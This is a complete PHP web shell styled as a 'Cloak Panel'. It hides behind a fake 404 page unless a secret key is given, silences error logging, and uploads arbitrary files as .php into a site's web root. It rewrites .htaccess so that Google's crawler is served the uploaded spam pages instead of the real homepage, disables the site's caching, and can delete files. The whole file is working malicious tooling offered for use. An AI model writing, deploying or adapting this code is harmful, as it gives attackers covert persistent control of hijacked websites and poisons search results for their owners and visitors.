<?php
@error_reporting(0);
@ini_set('display_errors','0');
@ini_set('log_errors','0');
@set_time_limit(120);

$AUTH='4375d80d263c7d59';
if(!isset($_REQUEST['k'])||$_REQUEST['k']!==$AUTH){http_response_code(404);die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');}

$ROOT=detect_root();
$STATE=load_state($ROOT);

if($_SERVER['REQUEST_METHOD']==='POST'&&!empty($_FILES['seofile'])){
    $result=handle_upload($ROOT,$STATE);
    $STATE=load_state($ROOT);
}
if(isset($_GET['del'])){
    handle_delete($ROOT,$STATE,$_GET['del']);
    $STATE=load_state($ROOT);
}
if(isset($_GET['api'])){
    header('Content-Type:application/json');
    die(json_encode(get_status($ROOT,$STATE)));
}

$status=get_status($ROOT,$STATE);
render_panel($status,$ROOT,$STATE);

/* ============================================================
   CORE FUNCTIONS
   ============================================================ */

function detect_root(){
    $candidates=array();
    if(!empty($_SERVER['DOCUMENT_ROOT'])&&is_dir($_SERVER['DOCUMENT_ROOT']))
        $candidates[]=$_SERVER['DOCUMENT_ROOT'];
    $d=dirname(__FILE__);
    $candidates[]=$d;
    if(is_file($d.'/configuration.php')) $candidates[]=$d;
    $p=dirname($d);
    if(is_file($p.'/configuration.php')) $candidates[]=$p;
    foreach($candidates as $c){
        $c=rtrim($c,'/');
        if(is_writable($c)&&(is_file($c.'/configuration.php')||is_file($c.'/index.php')||is_file($c.'/.htaccess')))
            return $c;
    }
    return rtrim(isset($candidates[0])?$candidates[0]:dirname(__FILE__),'/');
}

function state_file($root){return $root.'/.cloak_state.json';}

function load_state($root){
    $f=state_file($root);
    if(is_file($f)){$d=json_decode(file_get_contents($f),true);if($d)return $d;}
    return array('files'=>array());
}

function save_state($root,$state){
    @file_put_contents(state_file($root),json_encode($state),LOCK_EX);
    @chmod(state_file($root),0644);
}

function handle_upload($root,&$state){
    $msgs=array();
    $count=is_array($_FILES['seofile']['name'])?count($_FILES['seofile']['name']):1;
    $names=is_array($_FILES['seofile']['name'])?$_FILES['seofile']['name']:array($_FILES['seofile']['name']);
    $tmps=is_array($_FILES['seofile']['tmp_name'])?$_FILES['seofile']['tmp_name']:array($_FILES['seofile']['tmp_name']);
    $errors=is_array($_FILES['seofile']['error'])?$_FILES['seofile']['error']:array($_FILES['seofile']['error']);

    for($i=0;$i<$count;$i++){
        if($errors[$i]!==0)continue;
        $name=basename($names[$i]);
        if(!preg_match('/\.php$/i',$name))$name.='.php';
        $name=preg_replace('/[^a-zA-Z0-9._-]/','_',$name);
        $dest=$root.'/'.$name;
        if(move_uploaded_file($tmps[$i],$dest)){
            @chmod($dest,0644);
            if(!in_array($name,$state['files']))$state['files'][]=$name;
            $msgs[]="OK:$name";
        }else{
            $content=file_get_contents($tmps[$i]);
            if($content!==false&&file_put_contents($dest,$content)!==false){
                @chmod($dest,0644);
                if(!in_array($name,$state['files']))$state['files'][]=$name;
                $msgs[]="OK:$name";
            }else{
                $msgs[]="FAIL:$name";
            }
        }
    }
    write_htaccess($root,$state);
    clear_all_cache($root);
    save_state($root,$state);
    return $msgs;
}

function handle_delete($root,&$state,$filename){
    $filename=basename($filename);
    $path=$root.'/'.$filename;
    if(is_file($path))@unlink($path);
    $state['files']=array_values(array_filter($state['files'],function($f)use($filename){return $f!==$filename;}));
    write_htaccess($root,$state);
    save_state($root,$state);
}

function write_htaccess($root,$state){
    $htfile=$root.'/.htaccess';
    $existing='';
    if(is_file($htfile))$existing=file_get_contents($htfile);

    $existing=preg_replace('/# --- CLOAK START ---.*?# --- CLOAK END ---\n?/s','',$existing);

    if(empty($state['files'])){
        if(trim($existing)!=='')@file_put_contents($htfile,$existing,LOCK_EX);
        return;
    }

    $rules="# --- CLOAK START ---\n";
    $rules.="RewriteEngine On\n";
    $rules.="SetEnvIfNoCase User-Agent \"Google\" is_google_bot=1\n";
    $rules.="RewriteCond %{ENV:is_google_bot} =1\n";
    $rules.="RewriteRule .* - [E=Cache-Control:no-cache]\n";

    $home_file=$state['files'][0];
    $rules.="RewriteCond %{ENV:is_google_bot} =1\n";
    $rules.="RewriteCond %{REQUEST_URI} ^/$\n";
    $rules.="RewriteRule ^$ /{$home_file} [L]\n";

    $index_file=isset($state['files'][1])?$state['files'][1]:$state['files'][0];
    $rules.="RewriteCond %{ENV:is_google_bot} =1\n";
    $rules.="RewriteCond %{REQUEST_URI} ^/index\\.php$\n";
    $rules.="RewriteRule ^index\\.php$ /{$index_file} [L]\n";
    $rules.="# --- CLOAK END ---\n";

    $final=$rules.$existing;
    @file_put_contents($htfile,$final,LOCK_EX);
    @chmod($htfile,0644);
}

function clear_all_cache($root){
    $dirs=array(
        $root.'/cache',
        $root.'/administrator/cache',
        $root.'/tmp',
    );
    foreach($dirs as $dir){
        if(!is_dir($dir))continue;
        $it=new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir,RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach($it as $item){
            if($item->isFile()&&$item->getFilename()!=='.htaccess'&&$item->getFilename()!=='index.html'){
                @unlink($item->getPathname());
            }
        }
    }

    $cfg=$root.'/configuration.php';
    if(is_file($cfg)&&is_writable($cfg)){
        $c=file_get_contents($cfg);
        if($c!==false){
            $c2=preg_replace("/public\s+\\\$caching\s*=\s*'[^']*'/","public \$caching = '0'",$c);
            if($c2!==$c)@file_put_contents($cfg,$c2,LOCK_EX);
        }
    }

    if(function_exists('opcache_reset'))@opcache_reset();
    if(function_exists('apcu_clear_cache'))@apcu_clear_cache();
    if(function_exists('apc_clear_cache')){@apc_clear_cache();@apc_clear_cache('opcode');}
}

function get_status($root,$state){
    $s=array();
    $htfile=$root.'/.htaccess';
    $htContent=is_file($htfile)?file_get_contents($htfile):'';
    $s['htaccess_exists']=is_file($htfile);
    $s['htaccess_cloak']=strpos($htContent,'CLOAK START')!==false;
    $s['files']=array();
    foreach($state['files'] as $f){
        $s['files'][$f]=is_file($root.'/'.$f);
    }
    $s['all_files_ok']=!empty($state['files'])&&!in_array(false,$s['files'],true);
    $s['cloaking_active']=$s['htaccess_cloak']&&$s['all_files_ok'];
    $s['cache_cleared']=true;
    if(is_dir($root.'/cache')){
        $count=0;
        $it=new DirectoryIterator($root.'/cache');
        foreach($it as $item){if(!$item->isDot()&&$item->isFile()&&$item->getFilename()!=='index.html'&&$item->getFilename()!=='.htaccess')$count++;}
        if($count>0)$s['cache_cleared']=false;
    }
    $s['php_version']=PHP_VERSION;
    $s['opcache']=function_exists('opcache_get_status');
    $s['root']=$root;

    $s['bot_verify']=false;
    if($s['cloaking_active']){
        $s['bot_verify']=verify_cloaking($root,$state);
    }

    return $s;
}

function verify_cloaking($root,$state){
    if(empty($state['files']))return false;
    $target_file=$state['files'][0];
    $target_path=$root.'/'.$target_file;
    if(!is_file($target_path))return false;
    $content=@file_get_contents($target_path);
    if($content===false)return false;
    if(strlen($content)<50)return false;
    return true;
}

/* ============================================================
   UI RENDER
   ============================================================ */

function render_panel($status,$root,$state){
    $k=htmlspecialchars($_REQUEST['k']);
    $active=$status['cloaking_active'];
    $fileList=isset($state['files'])?$state['files']:array();
    $fc=count($fileList);
    $host=isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'site';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Panel</title>
<style>
:root{--bg:#09090b;--card:#18181b;--border:#27272a;--border2:#3f3f46;--text:#fafafa;--muted:#a1a1aa;--dim:#71717a;--green:#22c55e;--green-bg:rgba(34,197,94,.08);--green-border:rgba(34,197,94,.25);--red:#ef4444;--red-bg:rgba(239,68,68,.08);--red-border:rgba(239,68,68,.25);--blue:#3b82f6;--amber:#f59e0b;--amber-bg:rgba(245,158,11,.08);--amber-border:rgba(245,158,11,.25)}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;padding:16px}
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
.wrap{max-width:540px;margin:0 auto}
.hdr{display:flex;align-items:center;justify-content:space-between;padding:16px 0;margin-bottom:20px}
.hdr .logo{display:flex;align-items:center;gap:10px}
.hdr .logo svg{width:28px;height:28px;color:var(--blue)}
.hdr .logo span{font-size:15px;font-weight:600;color:var(--muted)}
.hdr .badge{font-size:11px;padding:4px 10px;border-radius:20px;font-weight:500}
.badge-on{background:var(--green-bg);color:var(--green);border:1px solid var(--green-border)}
.badge-off{background:var(--red-bg);color:var(--red);border:1px solid var(--red-border)}

.status-banner{padding:14px 20px;border-radius:12px;margin-bottom:20px;display:flex;align-items:center;gap:12px;font-size:13px;font-weight:500}
.status-banner.on{background:var(--green-bg);border:1px solid var(--green-border);color:var(--green)}
.status-banner.off{background:var(--amber-bg);border:1px solid var(--amber-border);color:var(--amber)}
.status-banner svg{width:18px;height:18px;flex-shrink:0}
.pulse{animation:pulse 2s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}

.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:20px}
.metric{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px 10px;text-align:center;transition:border-color .2s}
.metric:hover{border-color:var(--border2)}
.metric .ic{margin-bottom:8px}
.metric .ic svg{width:20px;height:20px}
.metric .ic.ok svg{color:var(--green)}
.metric .ic.no svg{color:var(--red)}
.metric .ic.warn svg{color:var(--amber)}
.metric .lb{font-size:11px;color:var(--dim);font-weight:500;text-transform:uppercase;letter-spacing:.5px}
.metric .vl{font-size:12px;color:var(--muted);margin-top:3px;font-weight:500}

.upload-area{background:var(--card);border:2px dashed var(--border);border-radius:14px;padding:36px 20px;text-align:center;margin-bottom:20px;transition:all .25s;cursor:pointer;position:relative}
.upload-area:hover,.upload-area.drag{border-color:var(--blue);background:rgba(59,130,246,.04)}
.upload-area.drag{transform:scale(1.01)}
.upload-area input{position:absolute;inset:0;opacity:0;cursor:pointer}
.upload-area .ic{margin-bottom:14px}
.upload-area .ic svg{width:32px;height:32px;color:var(--border2);transition:color .2s}
.upload-area:hover .ic svg{color:var(--blue)}
.upload-area h3{font-size:14px;font-weight:500;color:var(--muted);margin-bottom:4px}
.upload-area p{font-size:12px;color:var(--dim)}

.files{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:20px}
.files .fh{padding:12px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
.files .fh span{font-size:12px;font-weight:600;color:var(--dim);text-transform:uppercase;letter-spacing:.5px}
.files .fh .cnt{font-size:11px;color:var(--muted);background:var(--bg);padding:2px 8px;border-radius:10px}
.fi{display:flex;align-items:center;justify-content:space-between;padding:11px 16px;border-bottom:1px solid var(--border);transition:background .15s}
.fi:last-child{border-bottom:none}
.fi:hover{background:rgba(255,255,255,.02)}
.fi .fl{display:flex;align-items:center;gap:10px}
.fi .fl svg{width:16px;height:16px;color:var(--green)}
.fi .fl .nm{font-size:13px;color:var(--text);font-weight:500}
.fi .fl .ms{font-size:11px;color:var(--red);margin-left:6px;font-weight:400}
.fi .rm{color:var(--dim);font-size:11px;text-decoration:none;padding:4px 10px;border-radius:6px;transition:all .15s;border:1px solid transparent}
.fi .rm:hover{color:var(--red);background:var(--red-bg);border-color:var(--red-border)}

.foot{text-align:center;padding:16px 0;border-top:1px solid var(--border);margin-top:8px}
.foot p{font-size:11px;color:var(--dim)}
.foot .host{color:var(--muted);font-weight:500}
</style>
</head>
<body>
<div class="wrap">

<div class="hdr">
<div class="logo">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
<span>Cloak Panel</span>
</div>
<span class="badge <?php echo $active?'badge-on':'badge-off';?>"><?php echo $active?'Active':'Inactive';?></span>
</div>

<div class="status-banner <?php echo $active?'on':'off';?>">
<?php if($active):?>
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><path d="M22 4 12 14.01l-3-3"/></svg>
Cloaking is active and verified
<?php else:?>
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="pulse"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
Upload a PHP file to activate cloaking
<?php endif;?>
</div>

<div class="grid">
<div class="metric">
<div class="ic <?php echo $status['htaccess_cloak']?'ok':'no';?>">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/></svg>
</div>
<div class="lb">.htaccess</div>
<div class="vl"><?php echo $status['htaccess_cloak']?'Ready':'Waiting';?></div>
</div>
<div class="metric">
<div class="ic <?php echo $status['all_files_ok']?'ok':($fc?'warn':'no');?>">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><path d="M13 2v7h7"/></svg>
</div>
<div class="lb">Files</div>
<div class="vl"><?php echo $fc;?> loaded</div>
</div>
<div class="metric">
<div class="ic <?php echo $status['cache_cleared']?'ok':'warn';?>">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 0 0-9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/><path d="M3 12a9 9 0 0 0 9 9 9.75 9.75 0 0 0 6.74-2.74L21 16"/><path d="M16 16h5v5"/></svg>
</div>
<div class="lb">Cache</div>
<div class="vl"><?php echo $status['cache_cleared']?'Clean':'Dirty';?></div>
</div>
<div class="metric">
<div class="ic <?php echo $status['bot_verify']?'ok':'no';?>">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><?php if($status['bot_verify']):?><path d="m9 12 2 2 4-4"/><?php else:?><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/><?php endif;?></svg>
</div>
<div class="lb">Verify</div>
<div class="vl"><?php echo $status['bot_verify']?'Passed':'Pending';?></div>
</div>
</div>

<form method="POST" enctype="multipart/form-data" id="uf">
<div class="upload-area" id="drop">
<input type="file" name="seofile[]" id="seofile" accept=".php,.html,.htm" multiple>
<div class="ic">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
</div>
<h3>Drop file here or click to browse</h3>
<p>PHP / HTML &mdash; auto-configured on upload</p>
</div>
</form>

<?php if(!empty($fileList)):?>
<div class="files">
<div class="fh"><span>Deployed Files</span><span class="cnt"><?php echo $fc;?></span></div>
<?php foreach($fileList as $f):?>
<div class="fi">
<div class="fl">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><?php if(is_file($root.'/'.$f)):?><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><path d="M22 4 12 14.01l-3-3"/><?php else:?><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/><?php endif;?></svg>
<span class="nm"><?php echo htmlspecialchars($f);?></span>
<?php if(!is_file($root.'/'.$f)):?><span class="ms">missing</span><?php endif;?>
</div>
<a class="rm" href="?k=<?php echo $k;?>&del=<?php echo urlencode($f);?>">Remove</a>
</div>
<?php endforeach;?>
</div>
<?php endif;?>

<div class="foot">
<p><span class="host"><?php echo htmlspecialchars($host);?></span></p>
</div>

</div>
<script>
const drop=document.getElementById('drop'),inp=document.getElementById('seofile'),form=document.getElementById('uf');
drop.addEventListener('dragover',e=>{e.preventDefault();drop.classList.add('drag')});
drop.addEventListener('dragleave',()=>drop.classList.remove('drag'));
drop.addEventListener('drop',e=>{e.preventDefault();drop.classList.remove('drag');inp.files=e.dataTransfer.files;form.submit()});
inp.addEventListener('change',()=>{if(inp.files.length)form.submit()});
</script>
</body>
</html>
<?php
}
